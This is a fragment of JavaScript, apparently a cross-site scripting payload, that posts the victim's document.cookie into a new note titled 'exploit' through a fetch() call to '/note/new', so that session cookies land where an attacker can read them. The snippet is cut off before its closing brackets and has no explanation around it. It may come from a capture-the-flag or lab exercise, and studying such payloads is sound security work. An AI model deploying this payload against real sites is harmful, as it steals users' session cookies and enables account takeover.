fetch('/note/new', { method: 'POST',  
    body: JSON.stringify({ title: 'exploit', content: document.cookie, submit: 'save' })
